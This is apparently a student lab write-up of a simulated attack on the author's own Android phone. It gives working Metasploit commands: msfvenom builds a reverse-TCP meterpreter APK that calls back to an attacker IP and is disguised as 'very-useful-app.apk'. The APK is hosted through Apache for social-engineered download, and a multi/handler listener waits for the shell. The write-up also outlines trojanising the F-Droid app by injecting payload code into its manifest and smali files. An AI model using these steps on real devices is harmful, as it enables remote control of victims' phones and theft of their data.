For this simulated attack we will use my phone as the target device and my laptop as the attacking device. 
# Attack: Remote Shell execution by malicious payload present in target device

## Broad Idea
We will use a tool ```msfvenom``` to build an apk which will be downloaded on the target device, lets say via social engineering. We will then use ```msfconsole``` to listen on the listening port and connect to the reverse TCP shell on the target device.

### Generate the payload
```msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -o very-useful-app.apk```

```LHOST``` - The IP of the host who has sent the payload
```LPORT``` - The listening port for the payload to connect back to the attacker 
```-o``` - The name of the resulting apk file generated 

### Deliver the file to the target device [Android]
Here we are going the host the the app as a website and whenever the unsuspeting victim browses to the website, they are prompted to download the file. This may be especiallly convincing when the user is trying to download pirated software, video or music. 

```sudo mv very-useful-app.apk /var/www/html``` 
```cd var/www/html``` 
```service apache2 start``` 

This starts up a website hosted on our computer itself, which hosts the file. 
Here is the POV of the victim downloading the apk. 

```Note that Google Play Protect has been disabled for this denomstration which would otherwise flag the file and not let the installation go through```

[target_downloading_the_payload.mp4](:/99ff52b9117d493d939570d5fe875d6d)

As the victim downloads the app we prepare for our next step. We start up Metasploit and select the exploit ```exploit/multi/handler``` and set up the same ```LHOST``` and ```LPORT```. The attacking device will now start listening on port 4444 and wait for connection from the payload.

```msfconsole``` 
```use exploit/multi/handler``` 
```set LHOST <attacker-IP>``` 
```set LPORT 4444``` 
```exploit``` 

Once the phone has installed the app and the victim tries to run it, the payload should activate and we will be given a shell on the android device. During my tests, I found that the target device had to force-start the app via Termux to get a persistent connection, otherwise the app would almost immediately get shut down by the android device. 

[force_starting_the_service.mp4](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/force_starting_the_service.mp4)

After we get a shell, we can explore the CLI interface of the android by typing ```help``` in the terminal. We soon realise that a lot of the commands are not usable by us. We need to perform privilege escalation to execute other commands. 
After this attempt I left for my class. When I came back the shell stopped working. I could not believe what I just witnessed and slowly came to realisation that it was time to get my hands dirty.

This picture is the only proof I have that I had actually managed to get a meterpreter shell on that android phone.

![the_only_proof.jpeg](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/the_only_proof.jpeg)

## # Troubleshooting Attempt - 1
I initially thought that the connection was weak so I tried port forwarding. 

![ngrok.png](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/ngrok.png)

![another_payload_using_port_fwd.png](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/another_payload_using_port_fwd.png)

![couldnt_reproduce_output.png](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/couldnt_reproduce_output.png)

Sadly, the output is still the same and msfconsole is left at listening mode.

## # Troubleshooting Attempt - 2
By now we can say that this vulnerability has been patched and the only effective way to get past this is to get the android to think this is a legitimate app but I'm not very good at this so here's my attempt

We get a legitimate app from the internet to act as the trojan, here we use F-Droid

![legitimate_app.png](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/legitimate_app.png)

Then we have to decompile both the apps and inject the malicious code from the payload into the legitimate F-Droid App.

![decompiling_both_apps.png](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/decompiling_both_apps.png)

Injecting malicious code from the payload into the ```AndroidManifest.xml``` file

![injecting_malicious_code.png](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/injecting_malicious_code.png)

![locating_the_MainActivity_file.png](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/locating_the_MainActivity_file.png)

![editing_smali_of_legit_app.png](https://github.com/rugbedbugg/MFC_RealNetwork/blob/main/Simulated_attack/editing_smali_of_legit_app.png)

This final step i.e. to edit the ```.smali``` file of the legitmate app, after doing which it started throwing errors during recompilation of the program.


## Final thoughts

Probably should've written my own script as these vulnerabilites get patched pretty quickly.
